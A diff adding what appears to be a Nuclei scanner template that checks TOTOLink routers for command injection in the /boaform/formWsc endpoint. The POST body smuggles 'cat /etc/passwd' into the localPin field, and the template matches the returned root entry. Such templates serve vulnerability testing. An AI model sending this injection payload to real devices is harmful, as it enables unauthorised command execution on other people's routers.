@@ -1,0 +1,28 @@
+http:
+    - body: targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20||%20cat%20/etc/passwd
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      matchers:
+        - status:
+            - 200
+          type: status
+        - regex:
+            - 'root:.*:0:0:'
+          type: regex
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/boaform/formWsc'
+id: totolink-formwsc-rce
+info:
+    author: onewin
+    description: |
+        TOTOLink路由器在`/boaform/formWsc`接口存在远程命令注入漏洞，
+        攻击者可通过`localPin`参数注入恶意命令执行任意代码。
+    name: TOTOLink formWsc Remote Command Execution (RCE)
+    reference:
+        - https://example.com/totolink-rce-details
+    severity: critical
+    tags:
+        - TOTO_LINK
+        - totolink
